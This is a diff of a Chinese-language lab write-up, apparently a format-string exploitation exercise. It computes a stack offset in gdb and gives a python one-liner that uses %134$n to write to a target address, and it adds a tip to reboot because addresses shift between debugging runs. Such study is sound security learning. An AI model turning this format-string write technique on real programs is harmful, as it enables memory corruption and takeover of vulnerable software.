@@ -74,13 +74,17 @@ gdb调试，在vuln下断点，代入参数 python的方法
 
 如上图，此时target数值的地方在0xbffffe89处
 
-0xbffffe89-0xbffffc70= 537  
+0xbffffe89-0xbffffc70= 537
 
 537/4=134\(word\)+1
 
 从esp地方填充137个字+1 ,就到了target地方。
 
-python -c 'print "\x37\x96\x04\x08A%134\$n"'
+python -c 'print "\x37\x96\x04\x08A%134$n"'
+
+注意在调试过程中会出现地址变化的情况，执行一次成功后，如果还想再调试，最好重启机器。
+
+
 
 ref:
 
